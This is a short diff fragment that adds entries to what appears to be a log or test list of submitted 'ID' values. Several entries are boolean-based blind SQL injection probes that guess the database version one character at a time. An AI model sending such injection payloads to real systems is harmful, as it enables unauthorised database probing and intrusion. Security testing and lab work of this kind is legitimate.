@@ -51,3 +51,12 @@ ID:1' and (select substr(version(),1,1))< 6--
 ID:1' and (select substr(version(),1,1))= 6-- 
 ID:1
 ID:1
+ID:1
+ID:1
+ID:1' and (select substr(version(),1,1))< 1-- 
+ID:1' and (select substr(version(),1,1))< 1-- 
+ID:1' and (select substr(version(),1,1))< 6-- 
+ID:1' and 6= 6-- 
+ID:1' and (select substr(version(),1,1))= 1-- 
+ID:1' and (select substr(version(),1,1))= 1-- 
+ID:1
